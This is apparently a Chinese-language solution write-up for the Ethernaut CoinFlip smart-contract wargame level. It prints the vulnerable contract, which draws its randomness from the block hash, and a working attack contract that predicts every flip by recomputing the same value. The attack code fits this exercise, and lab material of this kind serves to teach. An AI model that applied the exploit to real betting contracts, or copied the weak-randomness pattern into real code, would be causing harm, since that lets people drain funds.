## 0x01 Source Code

```javascript
pragma solidity ^0.4.18;

contract CoinFlip {
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  function CoinFlip() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(block.blockhash(block.number-1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```

## 0x02 Solution

任务是要连续10次”猜中“`side`的值。

但是发现`flip()`中存在类似哈希的计算，直接写逆算法几乎不可能。

相反，因为`flip`算法已经暴露出来，可以直接利用其源代码来编写攻击合约。

```javascript
contract Attack {
  CoinFlip cf;
  // replace target by your instance address
  address target = 0x1111111111111111111111111111111111111111;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  function Attack() {
    cf = CoinFlip(target);
  }

  function calc() public view returns (bool){
    uint256 blockValue = uint256(block.blockhash(block.number-1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);
    return coinFlip == 1 ? true : false;
  }

  function flip() public {
    bool guess = calc();
    cf.flip(guess);
  }
}
```

查看正确猜测次数

```javascript
await contract.consecutiveWins().then(x => x.toNumber())
```



